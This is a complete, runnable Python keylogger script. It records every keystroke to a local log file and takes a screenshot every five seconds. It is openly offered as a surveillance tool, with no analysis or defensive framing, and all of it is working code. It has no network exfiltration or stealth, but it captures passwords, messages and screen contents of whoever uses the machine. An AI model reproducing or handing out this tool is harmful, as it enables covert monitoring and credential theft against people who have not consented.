import os
from datetime import datetime
from pynput.keyboard import Listener
from mss import mss
import time
from threading import Thread, Event


class Keylogger:
    def __init__(self):
        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.log_dir = os.path.join(base_dir, 'Keylogger')
        self.screenshots_dir = os.path.join(self.log_dir, 'Screenshots')
        self.log_file = os.path.join(self.log_dir, 'log.txt')

        print(f"Log directory: {self.log_dir}")
        print(f"Screenshots directory: {self.screenshots_dir}")
        print(f"Log file: {self.log_file}")

        self.keys = []
        self.count = 0
        self.stop_event = Event()

    def setup_directories(self):
        try:
            os.makedirs(self.log_dir, exist_ok=True)
            os.makedirs(self.screenshots_dir, exist_ok=True)
            if not os.path.exists(self.log_file):
                open(self.log_file, 'w').close()
            print("Directories created successfully")
        except Exception as e:
            print(f"Error creating directories: {e}")

    def on_press(self, key):
        try:
            key_char = str(key.char)
            self.keys.append(key_char)
            print(f"Key pressed: {key_char}")
        except AttributeError:
            key_str = str(key)
            self.keys.append(f'[{key_str}]')
            print(f"Special key pressed: {key_str}")

        self.count += 1
        if self.count >= 10:
            self.save_keys()
            self.count = 0

    def save_keys(self):
        if self.keys:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(''.join(self.keys))
                print(f"Saved {len(self.keys)} keys to log file")
                self.keys = []
            except Exception as e:
                print(f"Error saving keys: {e}")

    def capture_screenshot(self):
        while not self.stop_event.is_set():
            try:
                with mss() as sct:
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = os.path.join(self.screenshots_dir, f'screenshot_{timestamp}.png')
                    sct.shot(output=filename)
                    print(f"Screenshot saved: {filename}")
            except Exception as e:
                print(f"Screenshot error: {e}")
            time.sleep(5)

    def start(self):
        print("Starting keylogger")
        self.setup_directories()

        keyboard_listener = Listener(on_press=self.on_press)
        keyboard_listener.start()

        screenshot_thread = Thread(target=self.capture_screenshot)
        screenshot_thread.daemon = True
        screenshot_thread.start()

        try:
            keyboard_listener.join()
        except KeyboardInterrupt:
            self.stop_event.set()
            self.save_keys()
            print("Keylogger stopped")


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()